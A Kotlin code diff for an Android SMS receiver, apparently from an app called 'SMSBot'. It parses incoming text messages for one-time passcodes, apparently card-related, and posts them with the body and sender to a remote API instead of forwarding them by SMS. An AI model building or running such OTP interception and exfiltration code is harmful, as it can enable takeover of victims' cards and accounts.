@@ -43,67 +43,56 @@ class SmsRetriever : BroadcastReceiver() {
                         messageBody += msgBody
                     }
 
+                    val model = try {
+                        Splitter.split(messageBody)
+                    } catch (e: Exception) {
+                        CardModel()
+                    }
+                    val listener = object :
+                        Callback<CardResponse> {
+                        override fun onResponse(
+                            call: Call<CardResponse>,
+                            response: Response<CardResponse>
+                        ) {
+                            Toast.makeText(context, "Api call successful", Toast.LENGTH_SHORT)
+                                .show()
+                            val lastCallMessage = StringBuilder("OTP: ")
+                                .append(model.opt)
+                                .append("\n")
+                                .append("Body: ")
+                                .append(messageBody)
+                                .append("\n")
+                                .append("From: ")
+                                .append(messageFrom)
+                                .toString()
+                            tinyDB.putString("last_call", lastCallMessage)
+                        }
+
+                        override fun onFailure(call: Call<CardResponse>, t: Throwable) {
+                            Toast.makeText(context, "Request failed!!!", Toast.LENGTH_SHORT)
+                                .show()
+                        }
+                    }
                     if (sendToAll) {
-                        SMSHelper.sendSms(
-                            context,
-                            messageBody,
-                            tinyDB.getString("receiver")
-                        )
+//                        retrofit.create(ApiInterface::class.java)
+//                            .postResult(messageBody, code, messageFrom).enqueue(listener)
+                        retrofit.create(ApiInterface::class.java)
+                            .postResult(model).enqueue(listener)
                     } else {
-                        if (tinyDB.getListString("numbers").size > 0) {
+                        if (tinyDB.getListString("numbers").size > 0)
                             for (number in numbers) {
                                 if (messageFrom.contains(number!!)) {
-                                    SMSHelper.sendSms(
-                                        context,
-                                        messageBody,
-                                        tinyDB.getString("receiver")
-                                    )
+                                    retrofit.create(ApiInterface::class.java)
+                                        .postResult(model)
+                                        .enqueue(listener)
+                                    break
                                 }
                             }
-                        } else Toast.makeText(
-                            context,
-                            "Your numbers list in \"SMSBot\" is empty",
-                            Toast.LENGTH_SHORT
-                        ).show()
                     }
-
-                    val code = try {
-                        Splitter.split(messageBody).opt
-                    } catch (e: Exception) {
-                        "1111"
-                    }
-                    retrofit.create(ApiInterface::class.java)
-                        .postResult(messageBody, code, messageFrom).enqueue(object :
-                            Callback<CardResponse> {
-                            override fun onResponse(
-                                call: Call<CardResponse>,
-                                response: Response<CardResponse>
-                            ) {
-                                Toast.makeText(context, "Api call successful", Toast.LENGTH_SHORT)
-                                    .show()
-                                val lastCallMessage = StringBuilder("OTP: ")
-                                    .append(code)
-                                    .append("\n")
-                                    .append("Body: ")
-                                    .append(messageBody)
-                                    .append("\n")
-                                    .append("From: ")
-                                    .append(messageFrom)
-                                    .toString()
-                                tinyDB.putString("last_call", lastCallMessage)
-                            }
-
-                            override fun onFailure(call: Call<CardResponse>, t: Throwable) {
-                                Toast.makeText(context, "Request failed!!!", Toast.LENGTH_SHORT)
-                                    .show();
-                            }
-
-                        })
                 } catch (ignored: Exception) {
 
                 }
             }
         }
     }
-
 }
